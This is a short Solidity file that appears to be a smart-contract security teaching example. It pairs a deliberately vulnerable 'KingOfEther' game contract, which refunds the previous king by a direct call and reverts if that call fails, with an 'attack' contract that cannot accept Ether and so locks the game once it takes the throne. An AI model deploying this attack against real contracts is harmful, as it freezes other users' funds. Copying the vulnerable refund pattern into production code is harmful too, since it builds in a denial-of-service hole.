pragma solidity ^0.8.10;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract attack {
    KingOfEther koe;

    constructor(KingOfEther _koe) {
        koe = KingOfEther(_koe);
    }


    function attacks() public payable {
        koe.claimThrone{value: msg.value}();
    }
}
